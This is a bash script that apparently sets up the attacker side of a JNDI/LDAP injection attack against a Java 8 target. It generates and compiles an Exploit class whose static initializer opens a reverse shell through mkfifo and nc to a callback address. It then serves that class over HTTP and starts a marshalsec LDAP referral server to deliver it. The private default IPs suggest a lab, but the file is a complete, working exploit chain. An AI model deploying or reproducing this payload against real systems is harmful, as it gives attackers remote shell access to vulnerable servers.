#!/bin/bash
set -e

ATTACKER_IP="${ATTACKER_IP:-10.0.0.20}"
CALLBACK_IP="${CALLBACK_IP:-10.0.0.5}"
CALLBACK_PORT="${CALLBACK_PORT:-4444}"
PAYLOAD_PORT=8080
LDAP_PORT=1389

# Generate and compile Exploit.java with callback IP/port baked in.
# Compile with --release 8 so the class loads on the Java 8 victim JVM.
# Payload uses mkfifo + busybox nc — works on Alpine (no bash, no /dev/tcp).
echo "[*] Compiling Exploit.class (callback: ${CALLBACK_IP}:${CALLBACK_PORT})..."
cd /opt/payloads

cat > Exploit.java << EOF
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{
                "/bin/sh", "-c",
                "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${CALLBACK_IP} ${CALLBACK_PORT} >/tmp/f"
            });
        } catch (Exception e) { e.printStackTrace(); }
    }
}
EOF

javac --release 8 Exploit.java
echo "[*] Exploit.class ready (class file version 52 / Java 8)."

echo "[*] Starting payload HTTP server on :${PAYLOAD_PORT}..."
python3 -m http.server ${PAYLOAD_PORT} &

echo "[*] Starting marshalsec LDAP relay on :${LDAP_PORT}..."
exec java -cp /opt/marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://${ATTACKER_IP}:${PAYLOAD_PORT}/#Exploit" \
    ${LDAP_PORT}
